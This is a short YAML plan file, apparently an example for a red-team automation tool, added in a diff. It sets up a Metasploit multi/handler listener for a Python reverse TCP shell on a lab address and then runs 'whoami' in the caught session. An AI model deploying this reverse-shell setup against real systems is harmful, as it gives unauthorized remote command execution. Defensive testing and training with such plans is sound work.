@@ -1,0 +1,23 @@
+---
+plan:
+  name: MSF-Trigger example
+  owner: test name
+  stages:
+  - name: stage-one
+    trigger_type: MSFListener
+    trigger_args:
+      host: 192.168.56.10
+      port: 555
+      exploit: multi/handler
+      payload: python/shell_reverse_tcp
+      payload_arguments:
+        LHOST: 192.168.56.10
+        LPORT: 555
+    steps:
+    - name: execute-in-session
+      is_init: true
+      attack_module: mod_cmd
+      attack_module_args:
+        use_named_session: stage-one_session
+        cmd: whoami
+
